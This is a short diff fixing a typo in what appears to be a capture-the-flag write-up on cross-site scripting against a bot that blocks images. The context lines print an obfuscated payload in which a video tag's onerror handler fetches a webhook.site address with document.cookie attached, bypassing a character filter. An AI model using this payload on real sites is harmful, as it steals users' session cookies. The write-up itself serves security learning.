@@ -457,7 +457,7 @@ This payload works when "Show Fancy Name" is clicked, but doesn't when "Report N
 chrome_opts.add_argument("--blink-settings=imagesEnabled=false")  # don't load images
 ```
 
-Hence, `img` tag wont't work. Using `video` tag:
+Hence, `img` tag won't work. Using `video` tag:
 
 ```text
 ${banned[1]}video SRC=x onerror='fetch${banned[3]}${banned[0]}#34http${banned[0]}#115://webhook${banned[0]}#46${banned[0]}#115ite/c18ed5ff-57ec-4e82-87ba-7fb48728299a/?item=${banned[0]}#34+document${banned[0]}#46cookie${banned[4]}'${banned[2]}
